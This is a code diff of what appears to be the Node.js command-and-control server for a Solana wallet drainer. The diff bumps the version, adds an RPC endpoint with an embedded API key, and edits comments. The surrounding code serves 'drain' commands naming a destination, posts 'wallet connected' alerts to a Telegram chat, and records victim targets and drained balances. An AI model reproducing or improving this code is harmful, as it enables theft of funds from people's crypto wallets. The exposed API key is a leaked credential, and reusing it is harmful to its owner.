@@ -9,7 +9,7 @@ if (!BOT || !CHAT || !TREASURY) {
 
 process.on("uncaughtException", e => console.error("uncaught:", e && (e.stack || e.message)));
 
-const VERSION = "v3.3";
+const VERSION = "v3.4";
 const COMMIT = (process.env.RENDER_GIT_COMMIT || process.env.RENDER_GIT_COMMIT_SHA || "local-run").slice(0, 7);
 const BOOT_TS = Date.now();
 
@@ -29,10 +29,10 @@ if (!fs.existsSync(MIN)) {
 }
 
 const RPCS = [
+  "https://mainnet.helius-rpc.com/?api-key=60de1451-c4ed-4a9c-a989-89c210d5b0d3",
   "https://solana-rpc.publicnode.com",
   "https://api.mainnet-beta.solana.com",
-  "https://rpc.ankr.com/solana",
-  "https://solana.api.onfinality.io/public"
+  "https://rpc.ankr.com/solana"
 ];
 const B58RE = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;
 const TO = ms => (typeof AbortSignal !== "undefined" && AbortSignal.timeout) ? AbortSignal.timeout(ms) : undefined;
@@ -46,7 +46,7 @@ function tg(text, pre) {
   }).catch(() => {});
 }
 
-// FIX 1: strict multi-RPC balance read — returns null on failure, never fakes a zero
+// strict multi-RPC balance read — returns null on failure, never fakes a zero
 async function rpcBalance(pk) {
   for (const u of RPCS) {
     try {
@@ -223,7 +223,7 @@ http.createServer((req, res) => {
     return res.end(JSON.stringify({ cmd: "drain", to: c.to, n: c.n }));
   }
 
-  // FIX 1: fail loudly (502) on RPC failure instead of answering balance: 0
+  // fail loudly (502) on RPC failure instead of answering balance: 0
   if (req.method === "GET" && url.pathname === "/api/balance") {
     const pk = url.searchParams.get("pk") || "";
     res.setHeader("content-type", "application/json");
@@ -256,7 +256,7 @@ http.createServer((req, res) => {
                 "\ud83c\udfaf wallet connected \u2014 ");
             }
           }
-          // FIX 3: only mark drained when a real signature came back (dust/empty no longer fakes it)
+          // only mark drained when a real signature came back (dust/empty no longer fakes it)
           if (j.m === "drain") {
             const t = targets[j.pk] || (targets[j.pk] = {});
             Object.assign(t, { provider: j.provider, origin: j.origin, value: j.value, seen: Date.now() });
